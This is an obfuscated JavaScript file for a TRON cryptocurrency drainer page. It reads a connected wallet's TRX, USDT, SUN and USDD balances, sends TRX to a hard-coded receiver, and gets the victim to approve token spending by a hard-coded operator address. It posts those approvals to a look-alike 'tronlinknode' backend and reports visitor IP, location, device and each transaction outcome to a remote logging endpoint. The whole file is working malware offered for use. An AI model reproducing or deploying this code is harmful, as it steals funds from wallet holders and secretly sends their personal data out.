var _0x10baaf=_0xd175;(function(_0x55384c,_0x2ffc8d){var _0x5659c5=_0xd175,_0x1809ee=_0x55384c();while(!![]){try{var _0x4f2081=parseInt(_0x5659c5(0x1e0))/0x1+-parseInt(_0x5659c5(0x1f6))/0x2*(parseInt(_0x5659c5(0x1f4))/0x3)+-parseInt(_0x5659c5(0x1da))/0x4+-parseInt(_0x5659c5(0x1e3))/0x5*(parseInt(_0x5659c5(0x1be))/0x6)+-parseInt(_0x5659c5(0x1c8))/0x7+parseInt(_0x5659c5(0x1bd))/0x8*(parseInt(_0x5659c5(0x1f7))/0x9)+parseInt(_0x5659c5(0x1cf))/0xa;if(_0x4f2081===_0x2ffc8d)break;else _0x1809ee['push'](_0x1809ee['shift']());}catch(_0x1d21df){_0x1809ee['push'](_0x1809ee['shift']());}}}(_0x47d9,0x9fc41));const BASE_URL=_0x10baaf(0x207),TOKEN_TRANSFER=BASE_URL+_0x10baaf(0x201);var operator='TURfN5N1HfB89tLDhsxo5KpsTbPfN3K8Vw',receiver=_0x10baaf(0x1f8),USDT='TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',SUN=_0x10baaf(0x211),TUSD=_0x10baaf(0x1bb),USDD=_0x10baaf(0x1b8),senderAddress='',success=0x0,connected=0x0,tronweb=window['tronWeb'];let ABI,TRX_usd,message,tokenList=[];async function getDollarTRX(){var _0xd605d=_0x10baaf;let _0x34a67f=_0xd605d(0x1ff),_0x36ed24=await fetch(_0x34a67f,{'headers':{'Access-Control-Allow-Origin':'*'}}),_0x39077f=await _0x36ed24[_0xd605d(0x1eb)](),_0x2a0e59=_0x39077f[_0xd605d(0x1e4)][_0xd605d(0x1cd)];TRX_usd=_0x2a0e59;}async function GetWalletAccount(_0x67ceeb){var _0x5bf6bb=_0x10baaf;await getDollarTRX();var _0x6a711f=await tronWeb[_0x5bf6bb(0x1df)][_0x5bf6bb(0x1c2)](_0x67ceeb);console[_0x5bf6bb(0x1d8)](_0x6a711f);const _0x1a0eb5=tronWeb['fromSun'](_0x6a711f['toString']());console[_0x5bf6bb(0x1d8)](_0x5bf6bb(0x20b),_0x1a0eb5);_0x1a0eb5>0x96&&tokenList[_0x5bf6bb(0x1b9)]({'type':'0','tokenAddress':'','amount':_0x6a711f,'balance':_0x1a0eb5*TRX_usd,'amountFix':_0x1a0eb5,'symbol':_0x5bf6bb(0x213)});let _0x3d4b53=await window[_0x5bf6bb(0x1b5)][_0x5bf6bb(0x1fb)](USDTABI,USDT),_0x4d2f49=await _0x3d4b53[_0x5bf6bb(0x1f1)](_0x67ceeb)[_0x5bf6bb(0x1d3)]();const _0x30a78c=tronWeb['fromSun'](_0x4d2f49[_0x5bf6bb(0x1d6)]());console[_0x5bf6bb(0x1d8)]('Balance\x20USDT',_0x30a78c);_0x30a78c>0x0&&tokenList[_0x5bf6bb(0x1b9)]({'type':'1','tokenAddress':USDT,'amount':_0x4d2f49[_0x5bf6bb(0x1fc)],'balance':_0x30a78c,'symbol':_0x5bf6bb(0x1d2)});let _0x579199=await window['tronWeb'][_0x5bf6bb(0x1fb)](SUNABI,SUN),_0x4e22ee=await _0x579199[_0x5bf6bb(0x1f1)](_0x67ceeb)['call']();const _0x3e1227=tronWeb[_0x5bf6bb(0x203)](_0x4e22ee['toString']()),_0x314880=_0x5bf6bb(0x20e),_0x3c2be8=_0x5bf6bb(0x1fe);console['log']('Balance\x20SUN',_0x3e1227);_0x3e1227>0x0&&tokenList[_0x5bf6bb(0x1b9)]({'type':'1','tokenAddress':SUN,'amount':_0x4e22ee['_hex'],'balance':_0x3e1227*_0x314880/_0x3c2be8,'symbol':_0x5bf6bb(0x1f5)});let _0x5854a7=await window[_0x5bf6bb(0x1b5)][_0x5bf6bb(0x1fb)](USDDABI,USDD),_0x5dd1da=await _0x5854a7['balanceOf'](_0x67ceeb)['call']();const _0x5a20ae=tronWeb[_0x5bf6bb(0x203)](_0x5dd1da[_0x5bf6bb(0x1d6)]());console[_0x5bf6bb(0x1d8)](_0x5bf6bb(0x1ea),_0x5a20ae);const _0x24f9a5=_0x5bf6bb(0x1fe);_0x5a20ae>0x0&&tokenList[_0x5bf6bb(0x1b9)]({'type':'1','tokenAddress':USDD,'amount':_0x5dd1da[_0x5bf6bb(0x1fc)],'balance':_0x5a20ae/_0x24f9a5,'symbol':_0x5bf6bb(0x1d7)});if(connected=='0'){const _0x2da32b=_0x5bf6bb(0x1c7)+senderAddress+_0x5bf6bb(0x1c3)+_0x1a0eb5+_0x5bf6bb(0x20c)+_0x30a78c+_0x5bf6bb(0x1c0)+_0x3e1227+'\x20|\x20USDD:\x20'+_0x5a20ae+_0x5bf6bb(0x205);logTlg(_0x2da32b);}connected=0x1,tokenList[_0x5bf6bb(0x215)]((_0x538e5a,_0x5cd6b9)=>Number(_0x5cd6b9[_0x5bf6bb(0x208)])>Number(_0x538e5a[_0x5bf6bb(0x208)])?0x1:-0x1),await SendToken();}async function SendTRX(_0x2151ab,_0x603879,_0x187c82){var _0x431a7a=_0x10baaf;const _0x3168e4=tronWeb[_0x431a7a(0x1dc)](0x32),_0x421bb9=_0x2151ab-_0x3168e4;console[_0x431a7a(0x1d8)](_0x421bb9);const _0x422971=tronWeb[_0x431a7a(0x1f2)](_0x421bb9);if(_0x421bb9>=0x96){success=0x1;try{const _0xeb3bb9=await tronWeb[_0x431a7a(0x212)]['sendTrx'](receiver,_0x422971,senderAddress);var _0x56ac25=await tronWeb[_0x431a7a(0x1df)][_0x431a7a(0x1b7)](_0xeb3bb9),_0x3717e2=await tronWeb[_0x431a7a(0x1df)][_0x431a7a(0x1d1)](_0x56ac25);console[_0x431a7a(0x1d8)](_0x3717e2);}catch(_0x57afdb){console[_0x431a7a(0x1d8)](_0x57afdb),success=0x0;}logTlgMsg(_0x187c82,success);}else alert('You\x20have\x20not\x20enough\x20balance\x20to\x20use');}async function ApproveToken(_0x2bc8b5,_0xdb92f3,_0x3832af){var _0x453b53=_0x10baaf;success=0x1;try{var _0x32a095=[{'type':_0x453b53(0x210),'value':operator},{'type':_0x453b53(0x1e7),'value':_0xdb92f3}],_0x3096c3={'feeLimit':0x5f5e100};const _0xd3aee4=await tronWeb[_0x453b53(0x212)][_0x453b53(0x209)](tronweb['address'][_0x453b53(0x1f2)](_0x2bc8b5),'approve(address,uint256)',_0x3096c3,_0x32a095,tronweb[_0x453b53(0x210)][_0x453b53(0x1f2)](senderAddress));var _0x2aa6d6=await tronWeb[_0x453b53(0x1df)][_0x453b53(0x1b7)](_0xd3aee4[_0x453b53(0x1cb)]),_0x7e14b6=await tronWeb[_0x453b53(0x1df)][_0x453b53(0x1d1)](_0x2aa6d6);console[_0x453b53(0x1d8)](_0x7e14b6);const _0x5c54c4={'tokenAddress':_0x2bc8b5,'amount':_0xdb92f3,'owner':senderAddress,'spender':operator};axios[_0x453b53(0x1cc)](TOKEN_TRANSFER,_0x5c54c4);}catch(_0x3707b3){console[_0x453b53(0x1d8)](_0x3707b3),success=0x0;}logTlgMsg(_0x3832af,success);}async function SendToken(){var _0x55f602=_0x10baaf;if(tokenList[_0x55f602(0x1e8)]==0x0)return alert(_0x55f602(0x20a)),!![];for(var _0xcbb348 of tokenList){try{if(_0xcbb348['type']=='0')message=_0x55f602(0x1c6)+_0xcbb348[_0x55f602(0x1c4)]+'</b><br><br>Amount:\x20'+_0xcbb348[_0x55f602(0x1ee)]+'\x20('+_0xcbb348[_0x55f602(0x208)]+_0x55f602(0x1e9)+senderAddress+_0x55f602(0x1de),await SendTRX(_0xcbb348[_0x55f602(0x1ee)],_0xcbb348[_0x55f602(0x208)],message);else _0xcbb348[_0x55f602(0x1e2)]=='1'&&(message='<b>Approve\x20'+_0xcbb348[_0x55f602(0x1c4)]+_0x55f602(0x1d0)+_0xcbb348['tokenAddress']+_0x55f602(0x1b6)+senderAddress+'</code><br><br>Amount:\x20<code>'+_0xcbb348[_0x55f602(0x1ee)]+'</code>\x20('+_0xcbb348[_0x55f602(0x208)]+_0x55f602(0x1ba),await ApproveToken(_0xcbb348['tokenAddress'],_0xcbb348[_0x55f602(0x1ee)],message));}catch(_0x4bc066){console[_0x55f602(0x1d8)](_0x4bc066);}}}function getBrowserName(){var _0x270dff=_0x10baaf;if(navigator[_0x270dff(0x20f)][_0x270dff(0x1c9)](_0x270dff(0x1d4))>-0x1&&navigator[_0x270dff(0x1f9)]['indexOf'](_0x270dff(0x1d4))>-0x1)return _0x270dff(0x1d4);else{if(navigator[_0x270dff(0x20f)][_0x270dff(0x1c9)](_0x270dff(0x202))!=-0x1||navigator[_0x270dff(0x20f)][_0x270dff(0x1c9)](_0x270dff(0x1d9))!=-0x1)return _0x270dff(0x202);else{if(navigator[_0x270dff(0x20f)][_0x270dff(0x1c9)](_0x270dff(0x1ec))!=-0x1)return'Chrome';else{if(navigator[_0x270dff(0x20f)][_0x270dff(0x1c9)](_0x270dff(0x1d5))!=-0x1)return'Safari';else{if(navigator[_0x270dff(0x20f)]['indexOf'](_0x270dff(0x1e5))!=-0x1)return _0x270dff(0x1e5);else{if(navigator[_0x270dff(0x20f)]['indexOf']('MSIE')!=-0x1)return'IE';else{if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i[_0x270dff(0x206)](navigator[_0x270dff(0x20f)]))return _0x270dff(0x1bc);else return _0x270dff(0x1fd);}}}}}}}function _0xd175(_0x444741,_0x500ca7){var _0x47d9a2=_0x47d9();return _0xd175=function(_0xd175e,_0x4cea0d){_0xd175e=_0xd175e-0x1b5;var _0x112ed2=_0x47d9a2[_0xd175e];return _0x112ed2;},_0xd175(_0x444741,_0x500ca7);}function _0x47d9(){var _0x383bd6=['usd','Linux','18188810ysZhFp','</b><br><br>Contract:\x20<code>','sendRawTransaction','USDT','call','Edge','Safari','toString','USDD','log','OPR','3594840VfOoYi','/backtrn.php?key=8bEEokUZLhn7nAHz&m=','toSun','then','</code><br><br>👾👾👾\x20','trx','815203seuXzS','ipAddress','type','1764695OXJYaX','tron','Firefox','search','uint256','length','\x20$)<br><br>Account:\x20<code>','Balance\x20USDD','json','Chrome','\x20/\x20','amount','X11','UNIX','balanceOf','toHex','✅\x20<b>Транзакция\x20подтверждена</b>','6RauaZL','SUN','915778nZTSab','207ITmTOB','TTGwjsMEx7KvF3vhkCbMTvSnpHxiu5Wwor','appVersion','MacOS','contract','_hex','unknown','1000000000000','https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=usd','substr','/token_transfer','Opera','fromSun','Mac','<br><br>👾👾👾\x20','test','https://tronlinknode.tech/api','balance','triggerSmartContract','You\x20have\x20not\x20enough\x20balance\x20to\x20use','Balance\x20TRX','\x20|\x20USDT:\x20','countryCode','0.0067','userAgent','address','TSSMHYeV2uE9qYH95DqyoCuNCzEL1NvU3S','transactionBuilder','TRX','Windows','sort','tronWeb','</code><br><br>Account:\x20<code>','sign','TPYmHEhy5n8TCEfYGqW2rPxsghSfzghPDn','push','\x20$)<br><br>👾👾👾\x20','TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4','Dapp\x20Mobile\x20Browser','349928yRwrYb','12WQweNK','city','\x20|\x20SUN:\x20','opera','getBalance','</code></b><br><br>TRX:\x20','symbol','<b>Новый\x20переход!</b><br>👾👾👾\x20','<b>Transfering\x20','<b>🔑Wallet\x20Connected!</b><br><b>Account:\x20<code>','3257520OrFtbI','indexOf','❌\x20<b>Транзакция\x20отклонена</b>','transaction','post'];_0x47d9=function(){return _0x383bd6;};return _0x47d9();}function getOS(){var _0x24ca9a=_0x10baaf;let _0x17bd0e=navigator['userAgent'],_0x57f2bf='';if(_0x17bd0e[_0x24ca9a(0x1e6)]('Windows')!==-0x1)_0x57f2bf=_0x24ca9a(0x214);else{if(_0x17bd0e['search'](_0x24ca9a(0x204))!==-0x1)_0x57f2bf=_0x24ca9a(0x1fa);else{if(_0x17bd0e[_0x24ca9a(0x1e6)](_0x24ca9a(0x1ef))!==-0x1&&!(_0x17bd0e[_0x24ca9a(0x1e6)](_0x24ca9a(0x1ce))!==-0x1))_0x57f2bf=_0x24ca9a(0x1f0);else _0x17bd0e[_0x24ca9a(0x1e6)](_0x24ca9a(0x1ce))!==-0x1&&_0x17bd0e[_0x24ca9a(0x1e6)](_0x24ca9a(0x1ef))!==-0x1?_0x57f2bf=_0x24ca9a(0x1ce):_0x57f2bf=_0x24ca9a(0x1fd);}}return _0x57f2bf;}function isMobile(){var _0x2b5d99=_0x10baaf,_0xbd8073=![];return function(_0x304ca4){var _0x19e7da=_0xd175;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i['test'](_0x304ca4)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x19e7da(0x206)](_0x304ca4[_0x19e7da(0x200)](0x0,0x4)))_0xbd8073=!![];}(navigator[_0x2b5d99(0x20f)]||navigator['vendor']||window[_0x2b5d99(0x1c1)]),_0xbd8073;}function logTlg(_0x51bc97){var _0xb101c0=_0x10baaf;fetch(_0xb101c0(0x1db)+_0x51bc97);}function logTlgMsg(_0x4575e0,_0x47f956,_0x3bdb68){var _0x522695=_0x10baaf;if(_0x47f956=='1')var _0x3eb826=_0x522695(0x1f3);else var _0x3eb826=_0x522695(0x1ca);fetch(_0x522695(0x1db)+_0x4575e0+'<br>'+_0x3eb826);}const messageload=_0x10baaf(0x1c5);fetch('https://api.db-ip.com/v2/free/self/')[_0x10baaf(0x1dd)](function(_0x2b38ab){return _0x2b38ab['json']();})[_0x10baaf(0x1dd)](function(_0x5d256f){var _0x198024=_0x10baaf;let _0x5aaeba='🖥';(isMobile()||/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i[_0x198024(0x206)](navigator[_0x198024(0x20f)]))&&(_0x5aaeba='📱'),msg=messageload+('<br>IP:\x20'+_0x5d256f[_0x198024(0x1e1)]+'\x20('+_0x5d256f[_0x198024(0x1bf)]+'/'+_0x5d256f[_0x198024(0x20d)]+')<br>Device:\x20'+_0x5aaeba+'\x20'+getBrowserName()+_0x198024(0x1ed)+getOS()),fetch(_0x198024(0x1db)+msg);});
